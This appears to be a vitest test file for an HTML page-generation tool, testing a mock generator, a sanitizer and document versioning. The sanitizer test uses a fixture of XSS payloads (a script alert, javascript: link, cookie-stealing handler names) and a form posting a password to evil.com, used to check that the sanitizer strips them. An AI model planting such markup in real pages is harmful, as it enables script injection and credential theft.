import { describe, it, expect } from "vitest";
import { MockPageGenerationProvider } from "../../src/lib/generation/mock-provider";
import { PageGenerationRequest } from "../../src/lib/generation/schemas";
import { sanitizeGeneratedHtml } from "../../src/lib/generation/sanitizer";
import {
  createDocumentVersion,
  restoreVersionToHead,
} from "../../src/lib/generation/version-manager";

describe("Generation Engine, Sanitization & Versioning", () => {
  it("generates deterministic Tailwind landing page conforming to schema", async () => {
    const provider = new MockPageGenerationProvider();
    const request: PageGenerationRequest = {
      requestId: "req_123",
      conversationId: "conv_1",
      instruction: "Generate a developer tooling landing page",
      scope: "new_page",
      basedOnRevision: 0,
      attachmentIds: [],
      context: {
        designTokens: {
          colors: {
            allSampled: [],
            primary: {
              value: "rgb(37, 99, 235)",
              confidence: 0.9,
              frequency: 5,
              sampleNodeIds: ["btn-1"],
              evidence: ["computed-style"],
            },
          },
          typography: {
            fontFamilies: [
              { value: "sans", confidence: 0.9, frequency: 10, sampleNodeIds: [], evidence: [] },
            ],
            fontSizeScale: [],
            fontWeights: [],
            lineHeights: [],
          },
          spacing: {
            paddingScale: [],
            gapScale: [],
            containerWidths: [],
          },
          radii: [],
          shadows: [],
        },
      },
    };

    const stages: string[] = [];
    const result = await provider.generate(request, {
      onProgress: (stage) => stages.push(stage),
    });

    expect(result.id).toMatch(/^gen_/);
    expect(result.html).toContain("ProofUI");
    expect(result.html).toContain("data-editor-id");
    expect(result.validation.valid).toBe(true);
    expect(stages).toContain("Preparing context");
    expect(stages).toContain("Generating implementation");
    expect(stages).toContain("Ready for review");
  });

  it("sanitizer strips scripts, noscripts, inline handlers, and neutralizes forms", () => {
    const rawMalicious = `<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
  <h1>Safe Title</h1>
  <script>alert('xss');</script>
  <noscript>noscript content</noscript>
  <button onclick="doEvil()" onmouseover="stealCookies()">Click</button>
  <a href="javascript:alert(1)">Evil Link</a>
  <form action="https://evil.com/steal" method="POST">
    <input type="text" name="pwd" />
    <button type="submit">Submit</button>
  </form>
</body>
</html>`;

    const sanitized = sanitizeGeneratedHtml(rawMalicious);
    expect(sanitized.isValid).toBe(true);
    expect(sanitized.sanitizedHtml).not.toContain("<script>");
    expect(sanitized.sanitizedHtml).not.toContain("alert('xss')");
    expect(sanitized.sanitizedHtml).not.toContain("onclick");
    expect(sanitized.sanitizedHtml).not.toContain("onmouseover");
    expect(sanitized.sanitizedHtml).not.toContain("javascript:alert(1)");
    expect(sanitized.sanitizedHtml).toContain('onsubmit="return false"');
    expect(sanitized.sanitizedHtml).not.toContain('action="https://evil.com/steal"');
  });

  it("assigns stable data-editor-id attributes to every element", () => {
    const htmlWithoutIds = `<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
  <div>
    <p><span>Deep text</span></p>
  </div>
</body>
</html>`;

    const sanitized = sanitizeGeneratedHtml(htmlWithoutIds);
    expect(sanitized.isValid).toBe(true);
    expect(sanitized.assignedCount).toBeGreaterThan(3);
    expect(sanitized.sanitizedHtml).toContain('data-editor-id="body-root"');
  });

  it("creates document versions and appends a new head upon restoration", () => {
    const v1 = createDocumentVersion({
      parentVersionId: null,
      source: "initial",
      revision: 0,
      htmlReference: "<html>Initial</html>",
      summary: "Initial Document",
    });

    const v2 = createDocumentVersion({
      parentVersionId: v1.id,
      source: "ai-generation",
      revision: 1,
      htmlReference: "<html>Generated</html>",
      summary: "First Generation",
    });

    const versions = [v1, v2];

    // Restore back to v1
    const restored = restoreVersionToHead(versions, v1.id, 2);
    expect(restored).not.toBeNull();
    expect(restored?.restoredVersion.source).toBe("restored");
    expect(restored?.restoredVersion.revision).toBe(2);
    expect(restored?.restoredVersion.parentVersionId).toBe(v2.id);
    expect(restored?.restoredVersion.htmlReference).toBe("<html>Initial</html>");

    // Does not erase v2
    versions.push(restored!.restoredVersion);
    expect(versions.length).toBe(3);
    expect(versions[1].id).toBe(v2.id);
  });
});
